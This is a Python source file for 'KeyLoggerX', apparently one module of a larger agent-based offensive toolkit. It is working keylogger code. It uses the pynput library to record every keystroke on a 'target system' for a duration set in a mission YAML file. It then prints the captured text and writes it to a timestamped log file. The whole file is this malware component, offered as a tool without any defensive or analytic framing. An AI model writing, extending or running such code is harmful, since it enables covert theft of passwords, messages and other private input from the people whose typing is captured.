# agents/KeyLoggerX.py – Keystroke Logger (💠 SIGN 2.0 Upgrade)
# ------------------------------------------------------------------------------
# CENTRAL SIGNAL RELAY FOR ALL AGENTS – BUILT UNDER SIGN 2.0
# VOICE. SIGNAL. MEMORY. PURPOSE.
# ENGINEERED BY: PROFESSOR JOHNNY AI – 2025
# ------------------------------------------------------------------------------

from agents.PhantomAgentBase import PhantomAgentBase
import time
import os
from datetime import datetime
import yaml
import json

try:
    import pynput
    from pynput import keyboard
except ImportError:
    pynput = None

class KeyLoggerX(PhantomAgentBase):
    def __init__(self):
        super().__init__("KeyLoggerX")

    def execute(self):
        print("⌨️ KeyLoggerX active – capturing keystrokes.")
        if not self.mission:
            print("❌ No mission assigned.")
            return

        duration = int(self.mission.get("duration", 60))
        target_system = self.mission.get("target_system", "localhost")

        if pynput is None:
            print("❌ pynput library not installed. Keylogging not possible.")
            return

        keystrokes = []

        def on_press(key):
            try:
                keystrokes.append(key.char)
            except AttributeError:
                keystrokes.append(str(key))

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        print(f"🕒 Logging for {duration} seconds on {target_system}...")
        time.sleep(duration)
        listener.stop()

        print(f"✅ Captured keystrokes: {''.join(keystrokes)}")
        self.logs.append({
            "status": "Keylogging Completed",
            "target_system": target_system,
            "duration": duration,
            "keystrokes": ''.join(keystrokes)
        })

def load_mission_from_yaml(agent_name):
    yml_path = os.path.join("ops", "mission_targets", f"{agent_name}.yml")
    with open(yml_path, "r", encoding="utf-8") as f:
        return yaml.safe_load(f)

def save_agent_log(agent_name, data):
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    filename = f"{log_dir}/{agent_name}_{datetime.now():%Y%m%d_%H%M%S}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(json.dumps(data, indent=2))
    return filename

if __name__ == "__main__":
    mission = load_mission_from_yaml("KeyLoggerX")
    agent = KeyLoggerX()
    agent.mission = mission
    agent.execute()
    save_agent_log("KeyLoggerX", agent.logs)